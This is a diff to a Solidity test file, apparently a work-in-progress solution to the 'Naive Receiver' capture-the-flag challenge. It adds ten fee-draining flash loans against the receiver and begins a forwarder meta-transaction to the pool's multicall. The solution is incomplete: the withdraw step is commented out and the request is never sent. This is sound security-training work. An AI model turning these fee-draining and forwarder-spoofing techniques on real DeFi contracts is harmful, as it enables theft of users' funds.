@@ -77,12 +77,52 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        bytes[] memory data = new bytes[](1);
-        data[0] = abi.encodeWithSignature("maxFlashLoan(address)", address(weth));
-        console.log("test:");
-        pool.multicall(data);
+        bytes[] memory datas = new bytes[](11); // 10 for fees "deplete receiver funds" step + 1 for the big withdraw
+
+        for (uint256 i = 0; i < 10; i++) {
+            datas[i] = abi.encodeWithSignature("flashLoan(address,address,uint256,bytes)", receiver, weth, 0, "");
+        }
+
+        // datas[10] = abi.encodeWithSignature("withdraw(uint256,address)", ) hmmm
+
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0,
+            gas: 0,
+            nonce: 0,
+            data: abi.encodeWithSignature("multicall(bytes[])", datas),
+            deadline: block.timestamp + 1000
+        });
+
+        // pool.multicall(datas); // lets try to do it in 1 tx instead of 2 (because the multicall could be used directly since it doesn't check the _msgSender() unlike the withdraw function)
+
+
         console.log("works?");
     }
+
+    // ============================== My utils ===================================
+
+    function _getDataHash(BasicForwarder.Request memory request) internal view returns (bytes32) {
+        return BasicForwarder(forwarder).getDataHash(request);
+    }
+
+    function _hashTypedData(bytes32 structHash) internal view virtual returns (bytes32 digest) {
+        digest = BasicForwarder(forwarder).domainSeparator();
+
+        /// @solidity memory-safe-assembly
+        assembly {
+            // Compute the digest.
+            mstore(0x00, 0x1901000000000000) // Store "\x19\x01".
+            mstore(0x1a, digest) // Store the domain separator.
+            mstore(0x3a, structHash) // Store the struct hash.
+            digest := keccak256(0x18, 0x42)
+            // Restore the part of the free memory slot that was overwritten.
+            mstore(0x3a, 0)
+        }
+    }
+
+    // ===========================================================================
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
